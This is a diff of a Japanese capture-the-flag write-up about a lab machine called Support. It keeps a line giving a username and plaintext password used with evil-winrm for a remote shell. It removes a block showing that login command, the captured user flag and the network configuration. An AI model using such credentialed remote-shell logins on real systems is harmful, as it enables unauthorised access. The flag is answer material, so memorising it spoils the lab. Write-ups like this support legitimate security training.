@@ -118,24 +118,6 @@ objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
 
 ユーザ名support、パスワードIronside47pleasure40Watchfulで`evil-winrm`を実行したらユーザsupportのシェルがとれた。
 
-```
-┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
-└─$ evil-winrm --ip 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
-...
-*Evil-WinRM* PS C:\Users\support\Documents> cat ..\Desktop\user.txt
-17e17db2625b655d75ae2606b5182bec
-*Evil-WinRM* PS C:\Users\support\Documents> ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . :
-   IPv4 Address. . . . . . . . . . . : 10.10.11.174
-   Subnet Mask . . . . . . . . . . . : 255.255.254.0
-   Default Gateway . . . . . . . . . : 10.10.10.2
-```
 ![usertxt](https://user-images.githubusercontent.com/85237728/194680079-a0d7880f-ce8b-407e-8baf-f57a8367a305.png)
 
 # 感想
